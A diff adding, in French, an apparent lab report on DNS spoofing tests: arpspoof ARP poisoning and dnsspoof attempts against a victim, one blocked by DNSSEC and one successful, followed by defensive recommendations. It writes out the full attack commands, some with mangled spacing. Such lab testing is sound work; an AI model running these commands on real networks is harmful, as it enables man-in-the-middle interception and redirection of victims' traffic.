@@ -661,3 +661,213 @@ Confirmer cette autorité de certification pour identifier les sites web
 -  Aucun avertissement navigateur
 -  Redirection automatique HTTP → HTTPS
 -  Chaîne de confiance valide
+
+
+# Tests de sécurité — DNS Spoofing avec dsniff
+
+---
+
+# 1. Test n°1 : Tentative de DNS Spoofing (échec avec DNSSEC)
+
+## Objectif
+
+Réaliser une attaque de **DNS Spoofing (empoisonnement de cache)** sur une machine victime dans un réseau local, en utilisant les outils du paquet **dsniff** :
+
+- `arpspoof` : attaque Man-in-the-Middle  
+- `dnsspoof` : injection de fausses réponses DNS  
+
+But : faire résoudre **entreprise.lan** vers **192.31.25.14** (machine attaquante).
+
+---
+
+## Méthodologie
+
+### 1. Configuration du fichier de spoof DNS
+
+
+echo"192.31.25.14 entreprise.lan" |sudotee /etc/hosts_spoof
+
+
+---
+
+### 2. Activation de l’IP forwarding
+
+
+sudo sysctl-w net.ipv4.ip_forward=1
+
+
+---
+
+### 3. Empoisonnement ARP (MITM)
+
+
+sudo arpspoof-i eth0 -t 192.31.25.15 192.31.25.12
+
+sudo arpspoof-i eth0 -t 192.31.25.12 192.31.25.15
+
+
+---
+
+### 4. Lancement de dnsspoof
+
+
+sudo dnsspoof -i eth0-f /etc/hosts_spoof
+
+
+---
+
+### 5. Vérification côté victime
+
+
+dig entreprise.lan
+
+
+---
+
+## Résultats observés
+
+- La victime continue de recevoir la réponse du DNS légitime  
+- Ou reçoit une erreur SERVFAIL  
+- L’adresse spoofée n’est jamais utilisée  
+
+---
+
+## Analyse
+
+Le serveur DNS (192.31.25.12) utilise **DNSSEC**, ce qui implique :
+
+- signature des réponses DNS (`RRSIG`)  
+- publication des clés (`DNSKEY`)  
+- validation de la chaîne de confiance  
+
+Les réponses envoyées par `dnsspoof` étant non signées :
+
+- elles sont rejetées par le résolveur  
+- elles sont ignorées au profit des réponses légitimes  
+- ou provoquent une erreur de validation  
+
+Les outils utilisés ne permettent pas de générer des signatures DNSSEC valides.
+
+---
+
+## Conclusion
+
+L’attaque échoue dans cet environnement car :
+
+- DNSSEC est activé et validé  
+- les réponses falsifiées ne sont pas authentifiées  
+- le client rejette les données non conformes  
+
+Le mécanisme DNSSEC protège efficacement contre ce type d’attaque.
+
+---
+
+# 2. Test n°2 : Attaque DNS Spoofing (réussie sans protections)
+
+## Objectif
+
+Réaliser une attaque DNS Spoofing afin de rediriger le trafic DNS d’une victime vers l’attaquant dans un environnement ne disposant pas de protections avancées.
+
+---
+
+## Environnement de test
+
+| Rôle | Adresse IP |
+|------|-----------|
+| Attaquant (Kali) | 192.31.25.14 |
+| DNS légitime (BIND) | 192.31.25.12 |
+| Victime | 192.31.25.15 |
+
+---
+
+## Méthodologie
+
+### 1. Activation du routage IP
+
+
+sudo sysctl-w net.ipv4.ip_forward=1
+
+
+---
+
+### 2. Empoisonnement ARP (MITM)
+
+
+sudo arpspoof-i eth0-t192.31.25.15192.31.25.12
+
+sudo arpspoof-i eth0-t192.31.25.12192.31.25.15
+
+
+---
+
+### 3. Configuration des réponses DNS
+
+
+sudo nano /etc/dnsspoof_hosts
+
+192.31.25.14 www.entreprise.lan
+
+
+---
+
+### 4. Lancement de dnsspoof
+
+
+sudo dnsspoof-i eth0-f /etc/dnsspoof_hosts
+
+
+---
+
+## Résultats
+
+Avant l’attaque :
+
+
+www.entreprise.lan
+ → 192.31.25.20
+
+
+Pendant l’attaque :
+
+
+www.entreprise.lan
+ → 192.31.25.14
+
+
+---
+
+## Analyse
+
+L’attaque fonctionne car :
+
+- aucune validation DNSSEC n’est effectuée  
+- les réponses DNS ne sont pas authentifiées  
+- la victime accepte les réponses falsifiées  
+
+Le positionnement en Man-in-the-Middle permet d’intercepter et de modifier les requêtes DNS en temps réel.
+
+---
+
+## Conclusion
+
+L’attaque permet de :
+
+- détourner la résolution DNS  
+- rediriger la victime vers un hôte contrôlé  
+- intercepter ou manipuler le trafic  
+
+Elle démontre la vulnérabilité d’un réseau local ne disposant pas de mécanismes de sécurité.
+
+---
+
+## Recommandations de sécurité
+
+Pour se protéger contre ce type d’attaque :
+
+- déployer DNSSEC  
+- activer DHCP Snooping  
+- activer Dynamic ARP Inspection (DAI)  
+- segmenter le réseau via VLAN  
+- utiliser HTTPS pour sécuriser les communications applicatives  
+
+---
